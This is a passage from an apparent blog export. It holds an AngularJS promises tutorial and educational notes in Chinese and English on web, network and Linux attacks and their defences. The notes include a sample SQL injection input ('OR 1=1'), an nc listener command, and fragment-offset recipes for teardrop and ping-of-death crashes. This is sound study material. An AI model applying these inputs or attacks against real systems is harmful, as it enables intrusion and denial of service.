返回接收其他方法信号的promise对象基本使用流程是获取deferred对象，然后使用活动结果作为信号调用resolve或reject方法，可选择性通过notify方法提供临时更新。12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&lt;html ng-app=\"exampleApp\"&gt;&lt;head&gt; &lt;title&gt;Promises&lt;/title&gt; &lt;script src=\"angular.js\"&gt;&lt;/script&gt; &lt;link href=\"bootstrap.css\" rel=\"stylesheet\" /&gt; &lt;link href=\"bootstrap-theme.css\" rel=\"stylesheet\" /&gt; &lt;script&gt; angular.module(\"exampleApp\", []) .directive(\"promiseWorker\", function($q) &#123; var deferred = $q.defer(); return &#123; link: function(scope, element, attrs) &#123; element.find(\"button\").on(\"click\", function (event) &#123; var buttonText = event.target.innerText; if (buttonText == \"Abort\") &#123; deferred.reject(\"Aborted\"); &#125; else &#123; deferred.resolve(buttonText); &#125; &#125;); &#125;, controller: function ($scope, $element, $attrs) &#123; this.promise = deferred.promise; &#125; &#125; &#125;) .directive(\"promiseObserver\", function() &#123; return &#123; require: \"^promiseWorker\", link: function (scope, element, attrs, ctrl) &#123; ctrl.promise.then(function (result) &#123; element.text(result); &#125;, function (reason) &#123; element.text(\"Fail (\" + reason + \")\"); &#125;); &#125; &#125; &#125;) .controller(\"defaultCtrl\", function ($scope) &#123; &#125;); &lt;/script&gt;&lt;/head&gt;&lt;body ng-controller=\"defaultCtrl\"&gt; &lt;div class=\"well\" promise-worker&gt; &lt;button class=\"btn btn-primary\"&gt;Heads&lt;/button&gt; &lt;button class=\"btn btn-primary\"&gt;Tails&lt;/button&gt; &lt;button class=\"btn btn-primary\"&gt;Abort&lt;/button&gt; Outcome: &lt;span promise-observer&gt;&lt;/span&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; See the Pen promises by XmoyKing (@xmoyking) on CodePen. promiseWorker指令依赖$q服务，在工厂函数中调用$q.defer方法获取新的deferred对象，然后在link函数和控制器中能够使用它。link函数使用jqLite定位button元素并绑定click事件，在收到事件中，检查被单击元素的文本并调用deferred对象的resolve方法（为Heads和Tails按钮）或者reject方法（Abort按钮）两者之一，控制器定义promise属性来映射deferred对象和promise属性，通过控制器暴露该属性，可以允许其他指令获取与deferred对象有关的promise对象，并接收关于结果的信号。 defered对象用于标识用户单击按钮的结果，然后创建一个新的指令promiseObserver，监控和更新span元素的内容。promiseObserver指令使用require定义属性从其他指令中取得控制器，并获取promise对象，该对象定义如下方法： then(success, error, notify) 注册被函数以响应deferred对象的resolve，reject和notify方法，该函数所传参数是用于调用deferred对象的方法 catch(error) 仅注册错误处理函数 finally(fn) 注册无论解决还是拒绝都会被调用的函数， 理解promises感觉好像promises并没有什么出彩的地方，甚至还不如ajax理解起来那么容易，在上例中，promises表示一个活动的单一实例，一旦被解决或拒绝，promises无法再次使用，比如，单击Heads按钮，结果显示Heads，然后单击Tails按钮无效，因为promises已经被解决，无法再次使用，一旦设置，结果不变。这意味这给观察者信号是“第一次用户选择Heads/Tails/Aborts”，如使用常规js的click事件，那其中每个仅能反映“用户单击按钮”，而不管用户单击的顺序和方式，即click事件可以重复，promises不能重复，一旦确定，即发出单一的活动结果作为信号。 链接多个then函数解决多个promises顺序使用1234567891011121314151617181920212223242526272829303132333435angular .module(\"exampleApp\", []) .directive(\"promiseWorker\", function($q) &#123; var deferred = $q.defer(); return &#123; link: function(scope, element, attrs) &#123; element.find(\"button\").on(\"click\", function(event) &#123; var buttonText = event.target.innerText; if (buttonText == \"Abort\") &#123; deferred.reject(\"Aborted\"); &#125; else &#123; deferred.resolve(buttonText); &#125; &#125;); &#125;, controller: function($scope, $element, $attrs) &#123; this.promise = deferred.promise; &#125; &#125;; &#125;) .directive(\"promiseObserver\", function() &#123; return &#123; require: \"^promiseWorker\", link: function(scope, element, attrs, ctrl) &#123; ctrl.promise .then(function(result) &#123; return \"Success (\" + result + \")\"; &#125;) .then(function(result) &#123; element.text(result); &#125;); &#125; &#125;; &#125;) .controller(\"defaultCtrl\", function($scope) &#123;&#125;); See the Pen promises链 by XmoyKing (@xmoyking) on CodePen. 通过$q.all解决多个promises协同使用123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263&lt;html ng-app=\"exampleApp\"&gt;&lt;head&gt; &lt;title&gt;Promises&lt;/title&gt; &lt;script src=\"angular.js\"&gt;&lt;/script&gt; &lt;link href=\"bootstrap.css\" rel=\"stylesheet\" /&gt; &lt;link href=\"bootstrap-theme.css\" rel=\"stylesheet\" /&gt; &lt;script&gt; angular.module(\"exampleApp\", []) .directive(\"promiseWorker\", function ($q) &#123; var deferred = [$q.defer(), $q.defer()]; var promises = [deferred[0].promise, deferred[1].promise]; return &#123; link: function (scope, element, attrs) &#123; element.find(\"button\").on(\"click\", function (event) &#123; var buttonText = event.target.innerText; var buttonGroup = event.target.getAttribute(\"data-group\"); if (buttonText == \"Abort\") &#123; deferred[buttonGroup].reject(\"Aborted\"); &#125; else &#123; deferred[buttonGroup].resolve(buttonText); &#125; &#125;); &#125;, controller: function ($scope, $element, $attrs) &#123; this.promise = $q.all(promises).then(function (results) &#123; return results.join(); &#125;); &#125; &#125; &#125;) .directive(\"promiseObserver\", function () &#123; return &#123; require: \"^promiseWorker\", link: function (scope, element, attrs, ctrl) &#123; ctrl.promise.then(function (result) &#123; element.text(result); &#125;, function (reason) &#123; element.text(reason); &#125;); &#125; &#125; &#125;) .controller(\"defaultCtrl\", function ($scope) &#123; &#125;); &lt;/script&gt;&lt;/head&gt;&lt;body ng-controller=\"defaultCtrl\"&gt; &lt;div class=\"well\" promise-worker&gt; &lt;div class=\"btn-group\"&gt; &lt;button class=\"btn btn-primary\" data-group=\"0\"&gt;Heads&lt;/button&gt; &lt;button class=\"btn btn-primary\" data-group=\"0\"&gt;Tails&lt;/button&gt; &lt;button class=\"btn btn-primary\" data-group=\"0\"&gt;Abort&lt;/button&gt; &lt;/div&gt; &lt;div class=\"btn-group\"&gt; &lt;button class=\"btn btn-primary\" data-group=\"1\"&gt;Yes&lt;/button&gt; &lt;button class=\"btn btn-primary\" data-group=\"1\"&gt;No&lt;/button&gt; &lt;button class=\"btn btn-primary\" data-group=\"1\"&gt;Abort&lt;/button&gt; &lt;/div&gt; Outcome: &lt;span promise-observer&gt;&lt;/span&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; See the Pen 多个promises协同 by XmoyKing (@xmoyking) on CodePen.","categories":[{"name":"angularjs","slug":"angularjs","permalink":"https://github.com/xmoyKING/categories/angularjs/"}],"tags":[{"name":"angularjs","slug":"angularjs","permalink":"https://github.com/xmoyKING/tags/angularjs/"},{"name":"promises","slug":"promises","permalink":"https://github.com/xmoyKING/tags/promises/"}]},{"title":"信息安全小结","slug":"security-summary","date":"2017-06-26T10:59:09.000Z","updated":"2017-12-06T14:50:09.461Z","comments":true,"path":"2017/06/26/security-summary/","link":"","permalink":"https://github.com/xmoyKING/2017/06/26/security-summary/","excerpt":"","text":"简要涉及Web、网络、Linux等攻击原理和防御方式。 Web 什么是盒模型CSS盒子模式即具备这些属性：内容(content)、内边距(padding)、边框(border)、外边距(margin)。这些属性我们可以用日常生活中的常见事物——盒子作一个比喻来理解，所以叫它盒子模式。 CSS定位方式及其特性百度百科：CSS定位HTML和CSS高级指南之二——定位详解static 默认值，遵循基本的定位规定，不能通过z-index进行层次分级。relative 不脱离文档流，参考自身静态位置通过 top(上),bottom（下）,left（左）,right（右） 定位，并且可以通过z-index进行层次分级。absolute 脱离文档流，通过 top,bottom,left,right 定位。选取其最近的父级定位元素，当所有父级 position 为 static 时，absolute元素将以body坐标原点进行定位，可以通过z-index进行层次分级。fixed 固定定位，参考对像是可视窗口而并非是body或是父级元素。可通过z-index进行层次分级。 点击劫持/利用CSS盗取浏览历史利用不可见的iframe覆盖在伪装页面上，骗取用户对实际页面进行操作。利用浏览器对超链接不同状态下（未访问状态、鼠标hover/focus状态、已访问状态）链接的颜色的不同，可以知道用户的访问历史。 HTTPS HTTPS的作用在HTTP协议的基础上添加了SSL层（Secure Socket Layer），提供数据加密和身份验证功能，保证数据传输的安全性和完整性。SSL协议位于TCP/IP协议与各种应用层协议之间，为数据通讯提供安全支持。SSL协议可分为两层：SSL记录协议（SSL Record Protocol）：它建立在可靠的传输协议（如TCP）之上，为高层协议提供数据封装、压缩、加密等基本功能的支持。SSL握手协议（SSL Handshake Protocol）：它建立在SSL记录协议之上，用于在实际的数据传输开始前，通讯双方进行身份认证、协商加密算法、交换加密密钥等。具体作用： 保障用户隐私信息安全：SSL证书让网站实现加密传输，可以很好的防止用户隐私信息如用户名、密码、交易记录、居住信息等被窃取和纂改。比如电商网站安装SSL证书，就可以有效保障你登录电商网站支付时提交的用户名密码的安全。 帮助用户识别钓鱼网站：SSL证书可以认证服务器真实身份，可以有效的区别钓鱼网站和官方网站。网站部署全球信任的SSL证书后，浏览器内置安全机制，实时查验证书状态，通过浏览器向用户展示网站认证信息，让用户轻松识别网站真实身份，防止钓鱼网站仿冒。 利于网站SEO优化：因为部署了SSL证书的网站相比没有部署SSL证书的网站更加可信，更加安全，可以有效的保障用户的利益不受侵害。因此搜索引擎如谷歌，百度站在确保用户信息安全的角度，都在大力倡导网站部署SSL证书实现https加密访问。在搜索、展现、排序方面也给予部署了SSL证书网站优待。 提升公司品牌形象和可信度：网站部署SSL证书，让您的网站与其他网站与众不同。部署了SSL证书的网站会在浏览器地址栏显示https绿色安全小锁，如果是部署的EV SSL证书还会显示绿色地址栏和单位名称。可告诉用户其访问的是安全、可信的站点，可以放心的进行操作和交易，有效提升公司的品牌信息和可信度。 CSRF是什么，如何利用HTTPS防御CSRF了解XSS/CSRFCSRF攻击的主要目的是让用户在不知情的情况下攻击用户当前已登录的某个网站，类似于钓鱼。如用户当前已经登录了邮箱，或bbs，同时用户又登录另外一个已经被攻击者控制的站点，我们姑且叫它钓鱼网站。用户一登陆钓鱼网站，此时可能就会触发一个js的点击事件，构造一个bbs发帖的请求，去往你的bbs发帖，由于当前你的浏览器状态已经是登陆状态，所以session登陆cookie信息都会跟正常的请求一样，纯天然的利用当前的登陆状态，让用户在不知情的情况下，攻击者完成了攻击。CSRF防御 通过 referer、token 或者 验证码 来检测用户提交。 尽量不要在页面的链接中暴露用户隐私信息。 对于用户修改删除等操作最好都使用post操作 。 避免全站通用的cookie，严格设置cookie的域。 XSS XSS原理、如何防御了解XSS/CSRF攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的特殊目的。防御： 编码：不能对用户所有输入保持原样对用户输入的数据写入HTML文档 过滤：把输入不合法的过滤掉，保持安全性 HTTPONLY属性作用利用HTTP-only Cookie缓解XSS之痛为Cookie提供的一个新属性，阻止客户端脚本访问Cookie，缓解跨站点脚本攻击带来的信息泄露风险。使用HTTP-only Cookie后，Web 站点就能排除cookie中的敏感信息被发送给黑客的计算机或者使用脚本的Web站点的可能性。 Ajax异步特性Ajax知识体系大梳理非常全，而且讲到浏览器四种线程之间的配合AJAX工作原理及其优缺点简版Ajax其核心有JavaScript、XMLHTTPRequest、DOM对象组成，通过XmlHttpRequest对象来向服务器发异步请求，从服务器获得数据，然后用JavaScript来操作DOM而更新页面。与传统的web应用比较传统的Web应用交互由用户触发一个HTTP请求到服务器,服务器对其进行处理后再返回一个新的HTHL页到客户端, 每当服务器处理客户端提交的请求时,客户都只能空闲等待,并且哪怕只是一次很小的交互、只需从服务器端得到很简单的一个数据,都要返回一个完整的HTML页,而用户每次都要浪费时间和带宽去重新读取整个页面。这个做法浪费了许多带宽，由于每次应用的交互都需要向服务器发送请求，应用的响应时间就依赖于服务器的响应时间。这导致了用户界面的响应比本地应用慢得多。与此不同，AJAX应用可以仅向服务器发送并取回必需的数据，它使用SOAP或其它一些基于XML的Web Service接口，并在客户端采用JavaScript处理来自服务器的响应。因为在服务器和浏览器之间交换的数据大量减少，结果我们就能看到响应更快的应用。同时很多的处理工作可以在发出请求的客户端机器上完成，所以Web服务器的处理时间也减少了。 SQL注入SQL注入原理讲解，很不错！本质：保证select查询的where语句恒真，绕过条件筛选，最终实现直接查询到结果，比如123SELECT job_id, job_desc, min_lvl, max_lvlFROM jobsWHERE (job_id = 1) 在WHERE (job_id = 1)后添加OR 1=1修改为WHERE (job_id = 1) OR 1 = 1，修改后的select语句等同：12SELECT job_id, job_desc, min_lvl, max_lvlFROM jobs 如何防御，总的来说有以下几点： 永远不要信任用户的输入，要对用户的输入进行校验，可以通过正则表达式，或限制长度，对单引号和双”-“进行转换等。 永远不要使用动态拼装SQL，可以使用参数化的SQL或者直接使用存储过程进行数据查询存取。 永远不要使用管理员权限的数据库连接，为每个应用使用单独的权限有限的数据库连接。 不要把机密信息明文存放，请加密或者hash掉密码和敏感的信息。 应用的异常信息应该给出尽可能少的提示，最好使用自定义的错误信息对原始错误信息进行包装，把异常信息存放在独立的表中。 nc（NetCat）Linux nc命令用法收集nc -l 1234是什么意思 作为服务器监听本机的1234端口 Linux权限 chmod 4755 some_binary的作用改变some_binary文件的权限，文件所有者（owner）权限为可读可写可执行，用户组（group）和其他人（others）的权限为可读不可写可执行，同时执行者有SUID权限，即执行该文件时临时拥有文件所有者（owner）的权限。参考：Linux权限入门：Linux下用户组、文件权限详解Linux特殊权限标志位： Linux文件权限标志uid gid IP/ICMPIP/ICMP Security 通常的IP头最开始的01000101表示什么意思表示IP版本和头部长度，0100表示ipv4，0101表示头部长度为5，单位为4字节，即头部长度为20字节 为什么IP需要分片在IP层一个IP报文包括头部最大长度为65535字节，但是在其他层，比如链路层以太网最大的帧长度为1500，这种情况下为了保存数据的完整，就必须将IP进行分片。 TearDrop的原理（IP分片攻击）什么是Teardrop攻击原理：攻击者A给受害者B发送一些分片IP报文，并且故意将“分片偏移”字段（第13位）设置成错误的值(既可与上一分片数据重叠，也可错开)，B在组合这种含有重叠偏移的伪造分片报文时，会导致系统崩溃。防御：网络安全设备将接收到的分片报文先放入缓存中，并根据源IP地址和目的IP地址对报文进行分组，源IP地址和目的IP地址均相同的报文归入同一组，然后对每组IP报文的相关分片信息进行检查，丢弃分片信息存在错误的报文。为了防止缓存益处，当缓存快要存满是，直接丢弃后续分片报文。 ICMP重定向攻击原理ICMP重定向原理ICMP重定向报文是ICMP控制报文中的一种。在特定的情况下，当路由器检测到一台机器使用非优化路由的时候，它会向该主机发送一个ICMP重定向报文，请求主机改变路由。attacker伪装路由器router发送ICMP重定向包给受害者victim,通知其改变发包地址为other，受害者victim收到重定向包后将包发到改变自己的地址到指定的other处。 NmapNmap扫描原理与用法 nmap判断OS原理Nmap使用TCP/IP协议栈指纹来识别不同的操作系统和设备。在RFC规范中，有些地方对TCP/IP的实现并没有强制规定，由此不同的TCP/IP方案中可能都有自己的特定方式。Nmap主要是根据这些细节上的差异来判断操作系统的类型的。具体实现方式如下：Nmap内部包含了2600多已知系统的指纹特征（在文件nmap-os-db文件中）。将此指纹数据库作为进行指纹对比的样本库。分别挑选一个open和closed的端口，向其发送经过精心设计的TCP/UDP/ICMP数据包，根据返回的数据包生成一份系统指纹。将探测生成的指纹与nmap-os-db中指纹进行对比，查找匹配的系统。如果无法匹配，以概率形式列举出可能的系统。 nmap connect() 与nmap syn的异同TCP SYN scanning:这是Nmap默认的扫描方式，通常被称作半开放扫描（Half-open scanning）。该方式发送SYN到目标端口，如果收到SYN/ACK回复，那么判断端口是开放的；如果收到RST包，说明该端口是关闭的。如果没有收到回复，那么判断该端口被屏蔽（Filtered）。因为该方式仅发送SYN包对目标主机的特定端口，但不建立的完整的TCP连接，所以相对比较隐蔽，而且效率比较高，适用范围广。TCP connect scanning:TCP connect方式使用系统网络API connect向目标主机的端口发起连接，如果无法连接，说明该端口关闭。该方式扫描速度比较慢，而且由于建立完整的TCP连接会在目标机上留下记录信息，不够隐蔽。所以，TCP connect是TCP SYN无法使用才考虑选择的方式。 nmap idle scan原理伪造身份去扫描目标网络，所以看起来就像是无辜的Zombie主机在扫描。1.探查Zombie的IP ID并记录下来。2.在Zombie主机上伪造一个包，然后把包发送给目标主机端口。根据端口的状态，目标主机可能会也有可能不会导致Zombie主机IP ID值增加。3.再探查Zombie主机的IP ID。比较两次得到IP ID值就能分析出目标的端口信息。 iptables NAT原理NAT和端口映射的区别NAT基本原理及应用将一台外网IP地址机器的多个端口映射到内网不同机器上的不同端口 熟知端口 21 FTP 文件传输协议的端口号 23 Telnet远程终端协议的端口号 25 SMTP简单邮件传输协议的端口号 53 DNS域服务器所开放的端口 69 TFTP简单文件传送协议的端口号 80 HTTP超文本传输协议的端口号 443 HTTPS（Hyper Text Transfer Protocol over Secure Socket Layer）端口号 110 POP3邮局协议版本3的端口号 iptables 4表5链及其作用4个表:filter,nat,mangle,raw，默认表是filter（没有指定表的时候就是filter表）。表的处理优先级：raw&gt;mangle&gt;nat&gt;filter。 filter：包过滤 nat:用于nat功能（端口映射，地址映射等） mangle:包修改 raw:设置raw时一般是为了不再让iptables做数据包的链接跟踪处理，提高性能5个链：PREROUTING,INPUT,FORWARD,OUTPUT,POSTROUTING。 PREROUTING:数据包进入路由表之前 INPUT:通过路由表后目标为本机 FORWARDING:通过路由表后，目标不为本机 OUTPUT:由本机产生，向外转发 POSTROUTIONG:发送到网卡接口之前。 iptables实例iptables超全详解iptables使用范例详解利用iptables禁止外部访问，内部可访问https网站12345# 以下命令存在的一些问题：sudo iptables -P INPUT DROP #设置所有INPUT链默认规则为丢弃所有包，即不接受任何发至本机的包sudo iptables -A INPUT -p tcp -sport 80 -j ACCEPT #接收所有协议为tcp源端口为80的发至本机的包# 由于https的端口地址为443而不是80，所以应该将80换为443# 同时，output不做任何限制，只用对input链做出规则即可实现限制某种访问 Rootkit 什么是Rootkit百度百科：RootkitRootkit是一种特殊的恶意软件，它的功能是在安装目标上隐藏自身及指定的文件、进程和网络链接等信息;Rootkit一般都和木马、后门等其他恶意程序结合使用;Rootkit通过加载特殊的驱动，修改系统内核，进而达到隐藏信息的目的。 系统调用劫持过程系统调用的实现原理linux 系统调用中断劫持实现—原理和代码。Linux系统调用_详细全过程(PPT)系统调用的正常过程为： 保存堆栈现场 在调用号表中获取该系统调用名对应的系统调用号，将系统调用号存入eax寄存器 CPU通过int 0x80软中断指令发起中断转入内核态 在内核中调用system_call()，然后根据eax中已存的系统调用号在system_call_table（系统调用表）中找到对应该系统调用号（亦系统调用）的routine（服务例程）地址 执行该routine 执行完该routine后接着执行ret_from_sys_call()例程 恢复堆栈，最后返回到用户态。本次系统调用过程完成。系统调用劫持即修改routine的地址，指向攻击者设定的函数地址即可。在linux中使用0x80 异常实现系统调用，因此，主要的实现路径：获得中断向量表-&gt;获得系统调用中断处理函数地址-&gt;获得系统调用符号表-&gt;修改对应变量的偏移值指向新的系统调用程序(后门程序)。 /proc作用，ps命令工作原理Linux proc详解proc是Linux内核信息的抽象文件接口，大量内核中的信息以及可调参数都被作为常规文件映射到一个目录树中，这样我们就可以简单直接的通过echo或cat这样的文件操作命令对系统信息进行查取和调整了。同时proc也提供了一个接口，使得我们自己的内核模块或用户态程序可以通过proc进行参数的传递。在当今的Linux系统中，大量的系统工具也通过proc获取内核参数，例如ps、lspci等等，没有proc它们将可能不能正常工作。Linux ps命令示例说明ps命令是最基本同时也是非常强大的进程查看命令。使用该命令可以确定有哪些进程正在运行和运行的状态、进程是否结束、进程有没有僵死、哪些进程占用了过多资源等等。在/proc目录下存在大量以数字为名的子目录，这个数字就是相关进程的进程ID，这些目录就是系统当前运行进程的proc抽象。每一个目录都以相关联的活动系统进程PID为目录名，在目录下包含了一些文件，用于显示进程相关的信息，其中有一个status文件保存着当前该进程状态总览，包含进程名字、当前状态和各种信息统计。ps命令就是通过读取每一个进程目录下的status文件，并最终整理输出。 Buffer Overflow缓冲区溢出攻击原理分析 发生函数调用时的堆栈结构（通用） 如何利用Buffer Overflow获取Rootshell由于buf变量在栈中的位置，当buf变量发生溢出时，就会往高地址空间覆盖。先是覆盖main函数的其它局部变量，然后是父函数的ebp，再次是当前函数的返回地址eip，最后是父函数的栈空间。在buf中存放着精心设置过的内容，比如修改后的返回地址以及shellcode，同时将修改后返回地址覆盖在原返回地址处指向shellcode，当函数返回时，ret指令将0xffffd710弹出到寄存器，结果就是执行shellcode。 DOS(拒绝服务攻击总结): SYN Foold ，IP欺骗DOS ，UDP洪水，Ping洪流 ，teardrop ，Land ，Smurf ，Fraggle 攻击 原理","categories":[{"name":"mixed","slug":"mixed","permalink":"https://github.com/xmoyKING/categories/mixed/"}],"tags":[{"name":"css","slug":"css","permalink":"https://github.com/xmoyKING/tags/css/"},{"name":"https","slug":"https","permalink":"https://github.com/xmoyKING/tags/https/"},{"name":"linux","slug":"linux","permalink":"https://github.com/xmoyKING/tags/linux/"},{"name":"security","slug":"security","permalink":"https://github.com/xmoyKING/tags/security/"},{"name":"iptables","slug":"iptables","permalink":"https://github.com/xmoyKING/tags/iptables/"},{"name":"ip/icmp","slug":"ip-icmp","permalink":"https://github.com/xmoyKING/tags/ip-icmp/"},{"name":"rootkit","slug":"rootkit","permalink":"https://github.com/xmoyKING/tags/rootkit/"},{"name":"natcat","slug":"natcat","permalink":"https://github.com/xmoyKING/tags/natcat/"},{"name":"nmap","slug":"nmap","permalink":"https://github.com/xmoyKING/tags/nmap/"},{"name":"xss","slug":"xss","permalink":"https://github.com/xmoyKING/tags/xss/"},{"name":"sql injection","slug":"sql-injection","permalink":"https://github.com/xmoyKING/tags/sql-injection/"},{"name":"buffer overflow","slug":"buffer-overflow","permalink":"https://github.com/xmoyKING/tags/buffer-overflow/"}]},{"title":"Linux Rootkit","slug":"linux-rootkit","date":"2017-06-25T15:48:55.000Z","updated":"2017-06-25T15:48:55.000Z","comments":true,"path":"2017/06/25/linux-rootkit/","link":"","permalink":"https://github.com/xmoyKING/2017/06/25/linux-rootkit/","excerpt":"","text":"Definition of a Rootkit “Trojan Horse” into a Computer System Malicious Programs that pretend to be normal programs May also be programs: that masquerade as “possible” programs with names that approximate existing program already running and not easily identifiable by user Installing a Rootkit on a Target System Hacker MUST already have root level access on target system Gain root level access by compromising system via buffer overflow, password attack, social engineering Rootkit allows hacker to get back onto system with root level privilege Rootkits are a comparatively recent phenomenon Developed by hackers to conceal their activities One method is to replace existing binary system files that continue to function as normal but allow hacker back door access Can be developed by skilled hacker with programming expertise","categories":[{"name":"linux","slug":"linux","permalink":"https://github.com/xmoyKING/categories/linux/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://github.com/xmoyKING/tags/linux/"},{"name":"security","slug":"security","permalink":"https://github.com/xmoyKING/tags/security/"},{"name":"rootkit","slug":"rootkit","permalink":"https://github.com/xmoyKING/tags/rootkit/"}]},{"title":"IP/ICMP Security","slug":"ip-icmp","date":"2017-06-23T06:08:49.000Z","updated":"2017-06-23T06:08:49.000Z","comments":true,"path":"2017/06/23/ip-icmp/","link":"","permalink":"https://github.com/xmoyKING/2017/06/23/ip-icmp/","excerpt":"","text":"Overview： Introduction of IP and ICMP Potential Attacks due to vulnerabilities in IP and ICMP Introduction to a sniffer program IP ProtocolConnectionless Delivery System Unreliable: packets may be lost, duplicated, delayed or out of order Connectionless: each packet is treated independently from all others Best effort: tries its best Purpose of IPDefine the basic unit of data transferPerforms routing functionInclude rules about unreliable packet delivery: How hosts and routers should process packets; How and when error messages should be generated; The conditions under which packets can be discarded IP HeaderIn Chinese:ip包格式说明 Vers:Current IP version, IPv4IPv6 will have a different header HLEN: header length in 32-bit wordsnormally 5, i.e. 20 bytesMax 60 bytesHeader can be variable length (IP option) TOS (3 bit unused, 4 TOS bits, 1 unused)1, min delay, 0x10; 2, max throughput, 0x08; 3, max reliability, 0x40; 4, min cost, 0x20;Only one bit can be set Total Length: of datagram, in bytesMax size is 65535 IDENT, FLAGS, FRAGMENT OFFSET:Used for fragmentation and reassembly, will talk about this later TTL (Time To Live): upper limit on # routers that a datagram may pass throughInitialized by sender, and decremented by each router. When zero, discard datagram. This can stop routing loopsExample: ping –t TTL IP allows us to specify the TTL fieldQuestion: non-root users are not supposed to be able to modify the TTL field, how does ping do that? TYPE: IP needs to know to what protocol it should hand the received IP datagram1, ICMP; 2 IGMP; 6 TCP; 17 UDP; HEADER CHECKSUM 16-bit 1’s complement checksumCalculated only over header , Recomputed at each hop An example of IP datagram1234Header length: 20 octet TYPE: 01 (ICMP) Source IP: 128.10.2.3 Destination IP: 128.10.2.8 IP OPTIONS IP OPTIONS field is not required in every datagram Options are included primarily for network testing or debugging. The length of IP OPTIONS field varies depending on which options are selected. Record Route Option The sender allocates space in the option to hold IP addresses of the routers (i.e., an empty list is included in the option field) Each router records its IP address to the record route list; If the list is full, router will stop adding to the list Timestamp option; Source route option; IP Fragmentation Why do we need fragmentation? MTU: Maximum Transmission Unit An IP datagram can contain up to 65535 total octets (including header) Network hardware limits maximum size of frame (e.g., Ethernet limited to 1500 octets, i.e.,MTU=1500; FDDI limited to approximately 4470 octets/frame) IP fragmentation IP layers divide an IP datagram into several smaller fragments based on MTU Fragment uses same header format as datagram Each fragment is routed independently How is an IP datagram fragmented? How to fragment an IP datagram? IDENT: unique number to identify an IP datagram; fragments with the same identifier belong to the same IP datagram FRAGMENT OFFSET: Specifies where data belongs in the original datagram (dividable by 8 octets ) FLAGS:bit 0: reservedbit 1: do not fragmentbit 2: more fragments. This bit is turned off in the last fragment (Q: why do we need this bit?) How are IP fragments reassembled? All the IP fragments of a datagram will be assembled before the datagram is delivered to the layers above. Where should they be assembled? At routers or the destination?They are assembled at the destination.IP reassembly uses a timer. If timer expires and there are still missing fragments, all the fragments will be discarded. Attacks against IP Attack 1: Denial of Service Attack 1st fragment: offset = 0 2nd fragment: offset = 64800 Result: The target machine will allocate 64 kilobytes of memory, which is typically held for 15 to 255 seconds. Windows 2000, XP, and almost all versions of Unix are vulnerable. Attack 2: TearDrop First packet : offset = 0 payload size N More Fragments bit on Second packet: More Fragments bit off offset + payload size &lt; N i.e., the 2 fragment fits entirely inside the first one. When OS tries to put these two fragments together, it crashes. Attack 3: Overlapping attacks against firewalls Many firewalls inspect each packet (fragment) separately. FO==0, filter; otherwise, pass without filter When filtering rule based on TCP header, but the TCP header is fragmented, the rule will fail TCP header is at the beginning of the data area of an IP packet. Firewalls often check TCP header: for example, SYN packet for connection request.Tiny Fragment Attack: Assumption: firewalls only check the packets with offset=0.Overlapping attacks: Assumption: firewalls only check the packets with offset=0. Tiny Fragment Attack RFC 791 : datagram with length 68 should not fragment anymore; IP header would be 60; and a minimum fragment is 8 bytes However, 8 bytes only include TCP Sport and DPort Prevention MethodsIf FO == 0 and Protocol = TCP and TRANSPORTLEN &lt; tmin, then drop packetIf FO ==1, then drop packet Overlapping Fragment Attack A filter is to drop TCP connection request packetsFirst fragment comes with SYN=1, ACK=1;Second fragment’s FO == 1, and with SYN=1, ACK = 0; Prevention methodIf FO == 1 and Protocol == TCP then Drop packet; ICMP Protocol and Its Security MotivationIP may fail to deliver datagrams because the destination is not available the time-to-live counter expires routers become congestedWe need to let the sender know what has happened PurposeICMP allows routers (and hosts) to send error or control messages to other routers or hostsICMP provides communication between the Internet Protocol software on one machine and the Internet Protocol software on another ICMP messages are not generated for errors that result from datagrams carrying ICMP error messages. Why? ICMP is only sent to the original source. Why? The Common ICMP header Each ICMP message has its own format, they all begin with the same three fields TYPE(8-bit): identifies the message CODE(8-bit): provides further information about the message type CHECKSUM(16-bit) In addition, ICMP messages that report errors always include the header and the first 64 data bits of the datagram causing the problem. ICMP Message TYPE0:Echo Reply3:Destination Unreachable4:Source Quency5:Redirect (chagearoute)8:Echo Request9:Router Advertisement10:Router Solicitation11:time Exceeded for a Datagram12:Parameter Problem on aDatagram13:timestamp Request14:Timestamp Reply17:Address Mask Request18:Address Mask Reply ICMP PacketsEcho request and reply message (TYPE=8 and TYPE=0) Used to test reachability The format of echo request/reply packets is the following: ICMP Route Redirect Format of ICMP route redirect message: Routers exchange routing information periodically to accommodate network changes and keep their routes up-to-date; but hosts don’t do this. A general rule:Routers are assumed to know correct routes; hosts begin with minimal routing information and learn new routes from routers IP hosts typically only configured with an IP address of a default router; any traffic is forwarded to the default IP router When a router detects a host using a nonoptimal route, it sends the host ICMP redirect message; requesting host change its route An example:Gateway G1, receives an Internet datagram from a host ;G1 checks its routing table and obtains the address of the next gateway, G2, the next hop on the route of the packet;However, if G2 and the host are on the same network, a redirect message is sent to the host Attacks Using ICMP MessagesMapping Network Topology For an attack on a network, mapping is the first step Sending individual ICMP echo: this is ping command Sending ICMP echo request to the network and broadcast address of a network Smurf Attacks Ping an IP-directed broadcast address, with the (spoofed) IP of a victim as the source address. Until 1999,standad required routers to forward such packets. Impact: All hosts on the network will respond to the victim, and thus overwhelm the victim. This is a denial-of-service attack. The key idea of this attack: Amplification and IP spoofing This is a protocol vulnerability. To solve this problem, we can do the following:*Disable IP-directed broadcasts at the router.Configure the operating system to prevent the machine from responding to ICMP packets sent to IP broadcast addresses. Ping of Death ICMP echo request with fragmented packets Maximum legal size of an ICMP echo request packet:65536 - 20- 8 = 65507 Fragmentation allows the bypass of the maximum size. For the last piece of the fragment, the following is possible: (offset + size) &gt;65535 Impact: some operating systems will crash Same attack with different IP protocol ICMP Redirect Attack Send an ICMP redirect packet to the victim, asking it to send its packet to another “router” Impact: man-in-the-middle attacks or DOS attacks RFC states that system must follow redirect unless it is a router Winfreez(e): in windows,ICMP Redirect: Yourself is the quickest link to ZThe victim changes its routing tableHost sends packets to itself in an infinite loop A SMALL SNIFFERProgramming with Pcap To capture packets using Pcap:To specify the interface to sniff on;Initialize pcapTo specify a filter and compile itTell pcap to enter a loop;Close pcap; Pcap: get default interface Initialize a Pcap Create a filter Enter a Loop Close a pcap 